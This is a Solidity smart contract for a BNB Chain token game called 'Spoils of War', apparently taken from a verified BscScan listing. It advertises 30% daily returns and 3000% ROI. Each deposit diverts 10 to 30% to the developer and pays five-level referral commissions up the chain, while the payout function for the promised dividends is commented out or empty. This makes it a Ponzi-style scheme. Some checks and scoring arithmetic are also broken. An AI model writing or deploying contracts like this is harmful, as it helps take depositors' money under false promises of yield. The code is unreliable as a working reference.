/**
 *Submitted for verification at BscScan.com on 2022-08-23
*/

// SPDX-License-Identifier: MIT License
pragma solidity 0.8.9;
pragma experimental ABIEncoderV2;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
    * @dev Initializes the contract setting the deployer as the initial owner.
    */
    constructor () {
      address msgSender = _msgSender();
      _owner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
    }

    /**
    * @dev Returns the address of the current owner.
    */
    function owner() public view returns (address) {
      return _owner;
    }
    
    modifier onlyOwner() {
      require(_owner == _msgSender(), "Ownable: caller is not the owner");
      _;
    }

    function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
      _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0), "Ownable: new owner is the zero address");
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
}

contract SpoilsOfWar is Context, Ownable, IBEP20 {
    using SafeMath for uint256;
	
	mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
	
    address payable public dev;  

    uint16 constant PERCENT_DIVIDER = 10000; 
    uint16[5] private ref_bonuses = [2500, 500, 300, 200, 100]; 

    uint256 public buys_bnb;
    uint256 public buys_token;

    uint256 public sells_bnb;
    uint256 public sells_token;
        
    uint256 public invest_bnb;
    uint256 public invest_token;
    
    uint256 public withdrawn;
    uint256 public ref_bonus;
    
    struct Tarif {
        uint256 life_days;
        uint256 percent;
    }

    struct Deposit {
        uint256 tarif;
        uint256 amount;
        uint40 time;
    }

    struct Player {
        address upline;
        uint8 clan; // {1,2,3}
        uint256 dividends;        
        
        uint256 total_buy_bnb;
        uint256 total_buy_token;
        uint256 total_sell_bnb;
        uint256 total_sell_token;

        uint256 total_invest_bnb;
        uint256 total_invest_token;
        
        uint256 total_refbonus;         
        
        uint40 lastWithdrawn;
        uint40 lastSwitched;
        
        Deposit[] deposits;
        uint256[5] structure;
    }

    mapping(address => Player) public players;
    mapping(uint256 => Tarif) public tarifs;

    //struct Member {
    //    string profileData;
    //    address[] invites;
    //}

    //mapping(address => Member) public players2;
    //mapping(uint256 => address) public members;
    uint public nextMemberNo;
  
    uint256[3] public clan_members = [10100, 10200, 10300]; // initial populations 
    uint256[3] public clan_leadership = [0, 0, 0];
    uint256[3] public clan_wealth =     [0, 0, 0];
    uint256[3] public clan_economy =    [0, 0, 0]; 
    uint256[3] public clan_arms =       [0, 0, 0]; 
    
    uint256[3] public clan_popfactor =     [0, 0, 0];
    uint256[3] public clan_wltfactor =     [0, 0, 0];
    uint256[3] public clan_ecofactor =     [0, 0, 0];
    uint256[3] public clan_excfactors =    [0, 0, 0]; 
    uint256[3] public clan_sellRates =    [1000000, 1000000, 1000000]; 
    
    uint256 constant BUYRATE = 100000;
    uint256 constant SELLRATE = 1000000;

    constructor() {	    
        _name = "Spoils of War";
        _symbol = "SOW";
        _decimals = 18;
        _totalSupply =  1000000000000 * 10**uint(_decimals); // 1T
        
        _balances[address(this)] = 700000000000 * 10**uint(_decimals); 
		emit Transfer(address(0), address(this), _balances[address(this)]);    
		
        _balances[msg.sender] = 300000000000 * 10**uint(_decimals); 
		emit Transfer(address(0), msg.sender, _balances[msg.sender]);		
        
        tarifs[100] = Tarif(10, 3000); //30% daily for 100 days => 3000% ROI
        dev = payable(msg.sender);		
    }

    function BuySOW() public payable {
        require(msg.value >= 0.01 ether, "Minimum Buy is 0.01 BNB!");

        uint256 tokens = msg.value.mul(BUYRATE);
        require(_balances[address(this)].sub(tokens) >= 0,"Not enough tokens!");        
        transferTokens(address(this), msg.sender, tokens);

        devSupport(msg.value,30);            

        Player storage player = players[msg.sender];        
        if(player.clan > 0)
        {
            player.total_buy_bnb += msg.value;       
            player.total_buy_token += tokens;       
            
            clan_wealth[player.clan-1] += msg.value;
            clan_economy[player.clan-1] += msg.value;
       
            commissionPayouts(msg.sender, msg.value);
        }
        buys_token += tokens;
        buys_bnb += msg.value;
    }

	function SellSOW(uint256 amount) external {       
        require(amount >= 10 ether,"Too small to sell!");        
        require(_balances[msg.sender] - amount >= 0,"Not enough tokens!");
        transferTokens(msg.sender, address(this), amount);

        Player storage player = players[msg.sender];    
        
        uint256 bnb;
        if(player.clan > 0)
        {
            bnb = amount.div(clan_sellRates[player.clan-1] - clan_excfactors[player.clan-1]); 

            player.total_sell_bnb += bnb;
            player.total_sell_token += amount;

            //decrease state's wealth
            clan_wltfactor[player.clan-1] += bnb;

            //decrease economy
            uint256 eco = SafeMath.div(SafeMath.mul(bnb, 20), 100);
            clan_ecofactor[player.clan-1] += eco;
        
        }else{
            bnb = amount.div(SELLRATE); 
        }

        payable(msg.sender).transfer(bnb);        
        
        sells_token += amount;
        sells_bnb += bnb;

        withdrawn += bnb;
    }
   
    function SignUp(address referral, uint8 clan, uint8 quickinvest) public payable {
        require(clan > 0, "Unknown Clan!");
        require(clan < 4, "Unknown Clan!");
        require(msg.value >= 0.01 ether, "Minimum BNB to start is 0.01 BNB!");

        Player storage player = players[msg.sender];
        require(player.clan == 0, "Already a Member!");

        player.clan = clan;
        setUpline(msg.sender, referral, clan);

        uint256 tokens = msg.value.mul(BUYRATE);
        clan_wealth[clan-1] += msg.value;

        if(quickinvest > 0)
        {
            investToken(msg.sender, msg.value, tokens);
        }else{
            // hold the tokens
            require(_balances[address(this)].sub(tokens) >= 0,"Not enough tokens!");        
            transferTokens(address(this), msg.sender, tokens);
        }
            
        //increase economy
        clan_economy[clan-1] += msg.value;

        devSupport(msg.value,20);     

        player.total_buy_bnb += msg.value;       
        player.total_buy_token += tokens;       
                
        buys_token += tokens;
        buys_bnb += msg.value;

        commissionPayouts(msg.sender, msg.value);

    }

    function InvestSOW(uint256 amount) external {      
        require(amount >= 100 ether,"Too small to invest!");         
        Player storage player = players[msg.sender];    
        require(player.clan > 0, "Does not belong to any clan!");
        require(_balances[msg.sender] - amount >= 0,"Not enough tokens!");

        transferTokens(msg.sender, address(this), amount);
        
        uint256 bnb = amount.div(clan_sellRates[player.clan-1] - clan_excfactors[player.clan-1]); 
        
        investToken(msg.sender, bnb, amount);
        clan_economy[player.clan-1] += bnb;                          
     }

    function Reinvest() external {
        //withdrawables to reinvest instead

    }

    function Invest() public payable {
        require(msg.value >= 0.01 ether, "Minimum BNB to invest is 0.01 BNB!");

        Player storage player = players[msg.sender];    
        require(player.clan > 0, "Not yet a Member!");
        
        uint256 tokens = msg.value.mul(BUYRATE);
        investToken(msg.sender, msg.value, tokens);
        
        clan_wealth[player.clan-1] += msg.value;
        clan_economy[player.clan-1] += msg.value;

        devSupport(msg.value,20);  

        player.total_buy_bnb += msg.value;       
        player.total_buy_token += tokens;       
            
        commissionPayouts(msg.sender, msg.value);

        buys_token += tokens;
        buys_bnb += msg.value;
    }

    function Funding(uint8 sector) public payable {
        require(msg.value >= 0.01 ether, "Minimum BNB to invest is 0.01 BNB!");

        Player storage player = players[msg.sender];    
        require(player.clan > 0, "Not yet a Member!");

        uint256 tokens = msg.value.mul(BUYRATE);
        investToken(msg.sender, msg.value, tokens);
               
        devSupport(msg.value,10);  

        player.total_buy_bnb += msg.value;       
        player.total_buy_token += tokens;       
            
        commissionPayouts(msg.sender, msg.value);

        buys_token += tokens;
        buys_bnb += msg.value;

        if(sector==1) {
            //war bonds
            clan_wealth[player.clan-1] += msg.value;
            clan_arms[player.clan-1] += msg.value;        
            clan_leadership[player.clan-1] += msg.value;        
            
        }else if(sector==2) {
            //train more soldiers
            clan_arms[player.clan-1] += msg.value;        
            clan_leadership[player.clan-1] += msg.value;        
            clan_popfactor[player.clan-1] += SafeMath.div(msg.value, 0.01 ether);
            clan_wltfactor[player.clan-1] += msg.value;
            clan_ecofactor[player.clan-1] += msg.value; 
        }else if(sector==3) {
            //fund R&D
            clan_arms[player.clan-1] += msg.value;        
            clan_leadership[player.clan-1] += msg.value;        
            clan_wltfactor[player.clan-1] += msg.value;
        }else if(sector==4) {
            //control or trim Population
            clan_arms[player.clan-1] += msg.value;        
            clan_leadership[player.clan-1] += msg.value;        
            clan_economy[player.clan-1] += msg.value;
            clan_popfactor[player.clan-1] += SafeMath.div(msg.value, 0.001 ether);
        }else if(sector==5) {
            //annex new territory
            clan_wealth[player.clan-1] += msg.value;
            clan_arms[player.clan-1] += msg.value;        
            clan_leadership[player.clan-1] += msg.value;       
            clan_members[player.clan-1] += SafeMath.div(msg.value, 0.005 ether);
           
        }     
        clan_excfactors[player.clan-1] += SafeMath.div(msg.value, 0.02 ether);                   
    }   
   


    function whosWinning() view external returns(uint8 winner) {
        uint256[3] memory percentages;

        percentages[getMidPopulation(clan_members[0],clan_members[1],clan_members[2])-1] = 10;

        uint256 mx1 = getHighest(clan_wealth[0],clan_wealth[1],clan_wealth[2]);
        percentages[0] += getPercentile(clan_wealth[0],mx1);
        percentages[1] += getPercentile(clan_wealth[1],mx1);
        percentages[2] += getPercentile(clan_wealth[2],mx1);

        uint256 mx2 = getHighest(clan_economy[0],clan_economy[1],clan_economy[2]);
        percentages[0] += getPercentile(clan_economy[0],mx2); //SafeMath.mul(100, SafeMath.div(25, SafeMath.div(clan_economy[0],SafeMath.mul(mx2, 100)) ));
        percentages[1] += getPercentile(clan_economy[1],mx2); //SafeMath.mul(100, SafeMath.div(25, SafeMath.div(clan_economy[1],SafeMath.mul(mx2, 100)) ));
        percentages[2] += getPercentile(clan_economy[2],mx2); //SafeMath.mul(100, SafeMath.div(25, SafeMath.div(clan_economy[2],SafeMath.mul(mx2, 100)) ));

        uint256 mx3 = getHighest(clan_leadership[0],clan_leadership[1],clan_leadership[2]);
        percentages[0] += getPercentile(clan_leadership[0],mx3); //SafeMath.mul(100, SafeMath.div(15, SafeMath.div(clan_leadership[0],SafeMath.mul(mx3, 100)) ));
        percentages[1] += getPercentile(clan_leadership[1],mx3); //SafeMath.mul(100, SafeMath.div(15, SafeMath.div(clan_leadership[1],SafeMath.mul(mx3, 100)) ));
        percentages[2] += getPercentile(clan_leadership[2],mx3); //SafeMath.mul(100, SafeMath.div(15, SafeMath.div(clan_leadership[2],SafeMath.mul(mx3, 100)) ));

        uint256 mx4 = getHighest(clan_arms[0],clan_arms[1],clan_arms[2]);
        percentages[0] += getPercentile(clan_arms[0],mx4); //SafeMath.mul(100, SafeMath.div(30, SafeMath.div(clan_arms[0],SafeMath.mul(mx4, 100)) ));
        percentages[1] += getPercentile(clan_arms[1],mx4); //SafeMath.mul(100, SafeMath.div(30, SafeMath.div(clan_arms[1],SafeMath.mul(mx4, 100)) ));
        percentages[2] += getPercentile(clan_arms[2],mx4); //SafeMath.mul(100, SafeMath.div(30, SafeMath.div(clan_arms[2],SafeMath.mul(mx4, 100)) ));
        
        if(percentages[0] > percentages[1] && percentages[0] > percentages[2]){
            return 1;
        }else if(percentages[1] > percentages[0] && percentages[1] > percentages[2]){
            return 2;
        }else if(percentages[2] > percentages[0] && percentages[2] > percentages[1]){
            return 3;
        }
        return 0;        
    }

    function getMidPopulation(uint256 a, uint256 b, uint256 c) pure private returns(uint256 value) {        
       
        if(a > b && b > c){
            return 2;
        }else if(b > a && a > c){
            return 1;    
        }else if(b > c  && c > a){
            return 3;    
        }else if(a > b  && b == c){
            return 1;    
        }else if(b > a  && a == c){
            return 2;    
        }else if(c > b  && b == a){
            return 3;    
        }else if(a == b && a > c && c > 0){
            return 3;
        }else if(a == c && a > b && b > 0){
            return 2;
        }else if(b == c && b > a  && a > 0){
            return 1;
        }
        return 0;        
    }

    function getHighest(uint256 a, uint256 b, uint256 c) pure private returns(uint256 value) {        
        if(a >= b && a >= c){
            return a;
        }else if(b >= a && b >= c){
            return b;    
        }else if(c >= a  && c >= b){
            return c;    
        }
        return 0;        
    }

    function getPercentile(uint256 a, uint256 h) pure private returns(uint256 value) {
        if(a == 0) { return 0; }
        return SafeMath.mul(100, SafeMath.div(20, SafeMath.div(a,SafeMath.mul(h, 100)) )); 
    }


    function ChangeClan(uint8 clan, uint8 quickinvest) public payable {
        require(clan > 0, "Unknown Clan!");
        require(clan < 4, "Unknown Clan!");
        require(msg.value >= 0.01 ether, "Minimum BNB to switch side is 0.01 BNB!");

        Player storage player = players[msg.sender];
        require(player.clan != clan, "Same Clan!");

        uint256 tokens = msg.value.mul(BUYRATE);

        clan_members[player.clan-1]--;
        
        uint256 wealth = player.total_buy_bnb;
        uint256 econ = SafeMath.div(SafeMath.mul(player.total_buy_bnb, 10), 100);
        clan_wltfactor[player.clan-1] += wealth;
        clan_ecofactor[player.clan-1] += econ;
        
        player.clan = clan;

        clan_wealth[clan-1] += (wealth + msg.value);
            
        if(quickinvest > 0)
        {
            investToken(msg.sender, msg.value, tokens);
        }else{
            // hold the tokens
            require(_balances[address(this)].sub(tokens) >= 0,"Not enough tokens!");        
            transferTokens(address(this), msg.sender, tokens);
        }
            
        //increase economy
        clan_economy[clan-1] += msg.value;

        devSupport(msg.value,20);     

        player.total_buy_bnb += msg.value;       
        player.total_buy_token += tokens;       
                
        buys_token += tokens;
        buys_bnb += msg.value;

        commissionPayouts(msg.sender, msg.value);

        player.lastSwitched = uint40(block.timestamp);

    }


    function investToken(address _addr, uint256 bnb, uint256 tokens) private {
        Player storage player = players[_addr];
        player.deposits.push(Deposit({
            tarif: 100,
            amount: tokens,
            time: uint40(block.timestamp)
        }));  
        
        player.total_invest_token += tokens;
        player.total_invest_bnb += bnb;
            
        invest_token += tokens;
        invest_bnb += bnb;
    }


    function devSupport(uint256 amount, uint256 perc) private {
        uint256 support = SafeMath.div(SafeMath.mul(amount, perc), 100);
        payable(dev).transfer(support); 
        withdrawn += support;          
    }


    function setUpline(address _addr, address _upline, uint8 clan) private {
        if(players[_addr].upline == address(0) && _addr != owner()) {

            //members[nextMemberNo] = _addr;
            nextMemberNo++;

            clan_members[clan-1]++;
        
            if(_balances[_upline] <= 0) {
                _upline = owner();
            }
           
            players[_addr].upline = _upline;
            //players2[_upline].invites.push(_addr);

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;
                _upline = players[_upline].upline;
                if(_upline == address(0)) break;
            }
          
        }
    }   
       
    
        
    function commissionPayouts(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            payable(up).transfer(bonus); 
            players[up].total_refbonus += bonus;

            ref_bonus += bonus;
            withdrawn += bonus;
			     
            up = players[up].upline;
        }
    }
    
    /*
	function Harvest() external {      
        
        getPayout(msg.sender);

        
        Player storage player = players[msg.sender];
     
        
        require(player.dividends > 0 || player.ref_bonus > 0, "No Income Yet!");
        
        uint256 amount;
        if((player.dividends+player.ref_bonus) > player.total_invested)
        {
            amount = player.total_invested;
            player.dividends = (player.dividends  + player.ref_bonus) - amount;
            player.ref_bonus = 0;
        }else{
            amount =  player.dividends + player.ref_bonus;
            player.dividends = 0;
            player.ref_bonus = 0;
        }
    
        amount =  player.dividends + player.ref_bonus;
        player.dividends = 0;
        player.ref_bonus = 0;

        player.total_withdrawn += amount;
        payable(msg.sender).transfer(amount);
        withdrawn += amount;           
    }
	*/

/*
    function userInfo(address _addr) view external returns(uint256 for_withdraw, 
                                                            uint256 total_invested, 
																uint256 total_withdrawn, 
																	uint256 total_ref_bonus, 
																		uint40 lastPayout,                                                               
																			uint256[3] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.computePayout(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends,
            player.total_invested,
			player.total_withdrawn,
            player.total_ref_bonus,
            player.lastWithdrawn,        
            structure
        );
    } 
  */
   
    function computePayout(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        //if(this.whosWinning() != player.clan){
        //    return 0;        
        //}

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.lastWithdrawn > dep.time ? player.lastWithdrawn : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : block.timestamp;

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }
        return value;
    }

 
    function getPayout(address _addr) private {
        uint256 payout = this.computePayout(_addr);
        if(payout > 0) { 
            players[_addr].lastWithdrawn = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }
      

    function transferTokens(address _from, address _to, uint256 amount) private {
        _balances[_to] = _balances[_to].add(amount);
        _balances[_from] = _balances[_from].sub(amount);
        emit Transfer(_from, _to, amount);
    }

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }

    function setDev(address newval) public onlyOwner returns (bool success) {
        dev = payable(newval);
        return true;
    }  


  
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }

    function burn(uint256 amount) public returns (bool) {
        _burn(_msgSender(), amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
    }

}


library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}